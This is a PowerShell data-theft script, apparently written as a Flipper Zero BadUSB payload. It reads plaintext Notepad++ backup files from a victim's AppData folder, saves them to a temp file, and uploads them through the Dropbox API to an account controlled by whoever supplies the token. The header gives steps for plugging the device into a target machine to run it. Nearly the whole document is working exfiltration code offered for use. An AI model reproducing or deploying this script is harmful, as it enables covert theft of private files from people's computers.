<#
.SYNOPSIS
    Name: f0-np-plus-plus-snoopy.ps1
    The purpose of this script is to read and export information which may be held in NotePad++ backups.

.DESCRIPTION
    This script is designed to work in conjunction with "Snoop.txt" to extract the information from NotePad++ backups using FlipperZero.
    Backups are stored in plaintext at C:\Users\<USERNAME>\AppData\Roaming\NotePad++\backup.
    This script will read the backup contents, export them to a file in the user temp directory and then upload them to your
    Dropbox if you provide a valid API key.

.NOTES
    Version:    1.0

    Author:     Contrxl

    Updated:    05/06/2024      -First version of standalone script.

.LINK 
    https://github.com/contrxl/flipper-stuff/tree/main/badusb

.EXAMPLE
    To run this as intended with FlipperZero:
        - Take a copy of "Snoop.txt"
        - Insert your DropBox API key in the $db variable.
        - Upload "Snoop.txt" to your FlipperZero in the SDCard/badusb/ folder.
        - Connect FlipperZero to target machine and run "Snoop.txt" from badusb.
#>

$FileName = "$ENV:tmp/$ENV:USERNAME-NPPlusData-$(Get-Date -f hh-mm_dd-MM-yyyy).txt"

$appdataroaming = $ENV:APPDATA
$toread = "Notepad++\backup"
$fullpath = Join-Path -Path $appdataroaming -ChildPath $toread
$filelist = Get-ChildItem $fullpath\*@*

function Get-backupContents{
    <#
    .SYNOPSIS
    This function reads the contents of the stored NotePad++ backups, currently there is no action taken if no backups are present.

    .NOTES
    To do: 
        - Add error or output message indicating that no backups could be found or accessed. Currently it will export a blank file.
    #>
    $backupcontents = ForEach ($filepath in $filelist)
    {
        $filecontent = Get-Content -Path $filepath
        [pscustomobject]@{
            'FileContent:' = $filecontent
        }
    }
    return $backupcontents
}

# Backup contents need to be converted to Json format before they can be correctly exported to a text file.
$backupcontents = Get-backupContents
$out = ConvertTo-Json $backupcontents
$out > $FileName 

function exfilData {
    <#
    .SYNOPSIS
    This function uploads the collected data to your DropBox when an API key is provided as $db.

    .NOTES
    To do:
        - Add clean up here to remove the temp file created after it is uploaded.
    #>
    [CmdletBinding()]
    param (
    [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
    [Alias("f")]
    [string]$SourceFilePath
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    }

# Checks that the $db value is not empty, if the value is present, runs the script.
if (-not ([string]::IsNullOrEmpty($db))){
    exfilData -f $FileName
}